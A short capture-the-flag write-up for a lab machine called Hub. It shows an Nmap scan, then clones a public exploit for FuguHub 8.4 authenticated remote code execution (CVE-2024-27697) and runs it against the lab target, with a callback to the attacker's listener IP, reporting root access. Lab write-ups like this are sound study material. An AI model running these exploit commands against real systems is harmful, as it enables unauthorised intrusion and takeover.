---
icon: ubuntu
---

# Hub - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.118.25 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 18:54 EDT
Nmap scan report for 192.168.118.25
Host is up (0.037s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 403 Forbidden
8082/tcp open  http     Barracuda Embedded Web Server
|_http-title: Home
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-server-header: BarracudaServer.com (Posix)
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Type: BarracudaServer.com (Posix)
|_  Server Date: Fri, 26 Sep 2025 22:54:55 GMT
9999/tcp open  ssl/http Barracuda Embedded Web Server
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Type: BarracudaServer.com (Posix)
|_  Server Date: Fri, 26 Sep 2025 22:54:56 GMT
|_http-title: Home
|_http-server-header: BarracudaServer.com (Posix)
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Not valid before: 2019-07-16T19:15:09
|_Not valid after:  2074-04-18T19:15:09
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
Device type: general purpose|router                                                                                                                 
Running: Linux 5.X, MikroTik RouterOS 7.X                                                                                                           
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3                                                      
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)                                                                             
Network Distance: 4 hops                                                                                                                            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                             
                                                                                                                                                    
TRACEROUTE (using port 5900/tcp)                                                                                                                    
HOP RTT      ADDRESS                                                                                                                                
1   29.06 ms 192.168.45.1                                                                                                                           
2   29.23 ms 192.168.45.254                                                                                                                         
3   29.29 ms 192.168.251.1                                                                                                                          
4   29.58 ms 192.168.118.25
```

### <mark style="color:$primary;">HTTP Port 8082 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2137).png" alt=""><figcaption></figcaption></figure>

The about page delivers us a version! I am going to try and find an exploit

### <mark style="color:$primary;">FuguHub 8.4 Authenticated RCE</mark>

I found a detailed exploit on this [**github repo**](https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697) I am going to clone it:

```
git clone https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697.git
```

Running the exploit:

```
python3 exploit.py -r 192.168.118.25 -rp 8082 -l 192.168.45.158 -p 80
```

<figure><img src="../../.gitbook/assets/image (2139).png" alt=""><figcaption></figcaption></figure>

We got root!? What! This has to be the easy machine I have ever done!
